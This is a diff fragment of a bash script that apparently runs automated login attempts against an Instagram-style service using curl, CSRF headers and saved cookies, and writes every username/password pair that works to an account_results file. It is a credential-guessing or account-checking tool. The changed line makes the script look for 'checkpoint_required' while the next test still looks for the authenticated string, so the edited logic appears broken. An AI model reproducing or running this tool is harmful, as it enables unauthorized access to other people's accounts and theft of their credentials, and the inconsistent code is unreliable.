@@ -126,7 +126,7 @@ function g0_l0g1n(){
 			   -H 'X-CSRFToken:'$xxxxxxxxxxxxx000000000000000000000000000000000000000000000000000000000000000xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx000000000000000000000000000000000000000xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'' \
 			   -H 'X-Requested-With: XMLHttpRequest' \
 			   --data 'username='$us3rn4m3'&password='$p4sswd'&intent' \
-			   -L --compressed -s -c c00kies.txt | grep -o '"authenticated": true')
+			   -L --compressed -s -c c00kies.txt | grep -o 'checkpoint_required')
 	if [[ $cHk_l0g1n =~ '"authenticated": true' ]]; then
 		printf "${GR}[✔] ${RD}Login Success :) [Username: ${GR}$us3rn4m3${RD}] ${RD}[Password: ${GR}$p4sswd${RD}]\n"
 		echo "Username: $us3rn4m3 | Password: $p4sswd" >> account_results_$time.txt
